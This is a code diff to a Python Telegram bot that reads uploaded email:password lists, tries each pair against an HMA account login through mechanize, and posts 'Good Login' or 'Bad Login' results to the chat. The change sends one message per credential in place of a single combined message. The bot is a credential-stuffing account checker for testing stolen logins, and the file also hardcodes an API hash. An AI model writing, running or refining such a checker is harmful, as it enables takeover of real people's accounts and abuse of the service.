@@ -14,10 +14,7 @@ api_hash = "7f31db7e8cd1c0959c187e2651935c00"
 # Initialize Pyrogram client
 app = Client("hma_bot",api_id=api_id, api_hash=api_hash, bot_token=BOT_TOKEN)
 
-hits=0
-bad=0
 def hma_login(email, password):
-    global hits,bad
     try:
         express = mechanize.Browser()
         express.set_handle_robots(False)
@@ -43,11 +40,8 @@ async def trans(client, m: Message):
             input: Message = await app.listen(editable.chat.id)
             x = await input.download()
 
-
             path = f"./downloads/"
             editable = await m.reply_text(f"Starting Account Checking.........")
-
-            results = []
 
             with open(x, 'r') as file:
                 for line in file:
@@ -56,15 +50,14 @@ async def trans(client, m: Message):
                         email, password = line.split(':', 1)
                         success, message = hma_login(email, password)
                         if success:
-                            results.append(f"Good Login for {email} : {password}")
+                            result_message = f"Good Login for {email} : {password}"
+                            await app.send_message(m.chat.id, result_message)
                         else:
-                            results.append(f"Bad Login for {email}: {password} - {message}")
+                            result_message = f"Bad Login for {email}: {password} - {message}"
+                            await app.send_message(m.chat.id, result_message)
                     else:
-                        results.append(f"Invalid line format: {line}")
-
-        # Prepare and send results as a single message
-            response_message = "\n".join(results)
-            await app.send_message(m.chat.id, response_message)
+                        result_message = f"Invalid line format: {line}"
+                        await app.send_message(m.chat.id, result_message)
     
         except Exception as e:
             await app.send_message(m.chat.id, f"An error occurred: {str(e)}")
